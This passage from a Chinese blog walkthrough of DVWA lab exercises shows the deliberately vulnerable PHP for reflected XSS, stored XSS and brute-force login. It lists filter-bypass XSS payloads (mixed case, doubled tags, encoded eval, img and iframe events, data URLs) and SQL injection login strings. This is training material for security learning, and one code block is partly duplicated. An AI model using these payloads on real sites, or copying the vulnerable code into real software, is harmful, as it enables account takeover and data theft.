type属性规定脚本的MIME类型。Javascript的常见应用时图像操作、表单验证以及动态内容更新。</span><br></pre></td></tr></table></figure><h4 id="常用javaScript方法"><a href="#常用javaScript方法" class="headerlink" title="常用javaScript方法"></a>常用<code>javaScript</code>方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">atert</span><br><span class="line">alert（）方法用于显示带有一条指定消息和一个确认按钮的警告框</span><br><span class="line"></span><br><span class="line">window.1ocation</span><br><span class="line">window.location对象用于获得当前页面的地址（URL），并把浏览器重定向到新的页面。</span><br><span class="line"></span><br><span class="line">1ocation.href返回当前显示的文档的完整URL </span><br><span class="line"></span><br><span class="line">onload张页面或一幅图像完成加载</span><br><span class="line"></span><br><span class="line">onsubmit确认按钮被点击</span><br><span class="line"></span><br><span class="line">onerror在加载文档或图像时发生错误</span><br></pre></td></tr></table></figure><h4 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h4><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用<code>str_replace</code>函数将输入中的<code>&lt;script&gt;</code>替换为空</p><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.大小写绕过：</span><br><span class="line">&lt;ScRipt&gt;alert(1);&lt;/ScRipt&gt;</span><br><span class="line">2.双写方式绕过 str_replace()函数</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/);&lt;/script&gt;</span><br><span class="line">3.使用非 script 标签的 xss payload</span><br><span class="line">img标签：</span><br><span class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;</span><br><span class="line">iframe标签：</span><br><span class="line">&lt;iframe onload=alert(1)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);height=0 width=0 /&gt;&lt;iframe&gt;</span><br></pre></td></tr></table></figure><h4 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h4><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;xxxxxxxxxx high&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;    // Get input    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );    // Feedback for end user    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;txt</span><br></pre></td></tr></table></figure><p><code>preg_replace()</code> 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。通过<code>img</code>、<code>body</code>等标签的事件或者<code>iframe</code>、<code>src</code>等标签的构造可利用的<code>js</code>代码。</p><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.使用 img 标签和其编码转换后的 XSS payload</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=1 onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;</span><br><span class="line">&lt;img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41))&gt;&lt;/img&gt;</span><br><span class="line">&lt;img src=1 onerror=eval(&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029&quot;)&gt;&lt;/img&gt;</span><br><span class="line">2.使用 iframe 标签</span><br><span class="line">&lt;iframe onload=alert(1)&gt;</span><br><span class="line">3.使用 DATA URL 进行 XSS</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。</p><h4 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h4><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>相关函数介绍</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim(string,charlist)</span><br></pre></td></tr></table></figure><p>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括<code>\0、\t、\n、\x0B、\r</code>以及空格，可选参数<code>charlist</code>支持添加额外需要删除的字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string(string,connection)</span><br></pre></td></tr></table></figure><p>函数会对字符串中的特殊符号<code>（\x00，\n，\r，\，&#39;，&quot;，\x1a）</code>进行转义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripslashes(string)</span><br></pre></td></tr></table></figure><p>函数删除字符串中的反斜杠。</p><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message栏的利用：</span><br><span class="line">输入&lt;script&gt;alert(1)&lt;/script&gt;，成功弹框：</span><br><span class="line">name栏的利用：</span><br><span class="line">发现前端html中对name有字数长度限制,F12修改即可</span><br></pre></td></tr></table></figure><h4 id="medium级别-1"><a href="#medium级别-1" class="headerlink" title="medium级别"></a>medium级别</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>相关函数介绍</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签。</span><br><span class="line"></span><br><span class="line">addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</span><br><span class="line"></span><br><span class="line">可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。</span><br></pre></td></tr></table></figure><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.双写绕过</span><br><span class="line"></span><br><span class="line">Burpsuite抓包改name参数为:</span><br><span class="line"></span><br><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">2.大小写混淆绕过</span><br><span class="line"></span><br><span class="line">Burpsuite抓包改name参数为&lt;ScRipt&gt;alert(1);&lt;/ScRipt&gt;:</span><br><span class="line"></span><br><span class="line">3.使用非 script 标签的 xss payload：</span><br><span class="line"></span><br><span class="line">例如：img标签：</span><br><span class="line"></span><br><span class="line">Burpsuite抓包改name参数为&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h4 id="high级别-1"><a href="#high级别-1" class="headerlink" title="high级别"></a>high级别</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正则表达式过滤了&lt;script&gt;标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS</span><br><span class="line">Burpsuite抓包改name参数为&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><h4 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h4><p><code>PHP htmlspecialchars()</code>函数</p><p>把预定义的字符转换为<code>HTML</code>实体:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号）成为 &amp;amp;</span><br><span class="line">&quot; （双引号）成为 &amp;quot; </span><br><span class="line">&apos; （单引号）成为 &amp;apos;//生效需要加 ENT_QUOTES 参数</span><br><span class="line">&lt; （小于）成为 &amp;lt;</span><br><span class="line">&gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure><p>可以看到，<code>Impossible Security Level</code>的代码使用<code>htmlspecialchars</code>函数把预定义的字符:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &quot; &apos; &lt; &gt;</span><br></pre></td></tr></table></figure><p>转换为<code>HTML</code>实体，防止浏览器将其作为<code>HTML</code>元素。从而防治了反射型<code>XSS</code>利用和危害。</p><h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><p>反射型<a href="https://www.cnblogs.com/yyxianren/p/11381559.html" rel="external nofollow" target="_blank">xss</a>博客</p><p>存储型<a href="https://www.cnblogs.com/yyxianren/p/11381461.html" rel="external nofollow" target="_blank">xss</a>博客</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><code>kali</code>自带：<code>BeEF</code></p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="low级别-1"><a href="#low级别-1" class="headerlink" title="low级别"></a>low级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query  = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;;</span><br></pre></td></tr></table></figure><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;#</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>抓包intruder模块爆破</p><h3 id="medium级别-2"><a href="#medium级别-2" class="headerlink" title="medium级别"></a>medium级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = mysql_real_escape_string( $user );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = mysql_real_escape_string( $pass );</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>mysqli_real_escape_string()</code>会将转义特殊字符，一定程度上防止<code>SQL</code>注入,sleep(2)降低了暴力破解速度,方法同low级别</p><h3 id="high级别-2"><a href="#high级别-2" class="headerlink" title="high级别"></a>high级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 